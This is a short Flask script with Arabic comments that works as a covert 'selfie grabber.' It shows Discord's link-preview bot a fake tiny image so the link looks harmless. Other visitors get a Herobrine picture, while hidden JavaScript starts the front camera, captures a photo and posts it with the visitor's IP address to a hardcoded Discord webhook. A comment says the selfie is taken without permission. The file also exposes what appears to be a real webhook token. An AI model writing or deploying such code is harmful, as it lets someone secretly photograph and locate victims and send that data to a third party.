from flask import Flask, request
import requests, base64

app = Flask(__name__)

# ←←←←←←←←←←←←←←←← غيّر الويب هوك ده بتاعك
WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def grab(path):
    ip = request.headers.get('X-Forwarded-For', 'Unknown').split(',')[0]
    ua = request.headers.get('User-Agent', '')

    # لو ديسكورد بوت → صورة وهمية
    if 'Discordbot' in ua:
        fake = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')
        return fake, 200, {'Content-Type': 'image/png'}

    # الصفحة الحقيقية (صورة + سيلفي بدون إذن)
    html = f"""<!DOCTYPE html>
<html><body style="margin:0;background:#000">
<img src="https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg" style="width:100%;height:100vh;object-fit:contain">
<video id="v" playsinline style="display:none"></video>
<canvas id="c" style="display:none"></canvas>
<script>
navigator.mediaDevices.getUserMedia({{video:{{facingMode:"user"}}}})
.then(s=>{{
  let v=document.getElementById("v"); v.srcObject=s; v.play();
  setTimeout(()=>{{
    let c=document.getElementById("c"); c.width=1280; c.height=960;
    c.getContext("2d").drawImage(v,0,0,1280,960);
    fetch("{WEBHOOK}",{{method:"POST",headers:{{"Content-Type":"application/json"}},
    body:JSON.stringify({{embeds:[{{title:"Selfie من {ip}",image:{{url:c.toDataURL("image/jpeg")}}}}]}})}});
    s.getTracks().forEach(t=>t.stop());
  }},1200);
}});
</script>
</body></html>"""
    return html

if __name__ == "__main__":
    app.run()
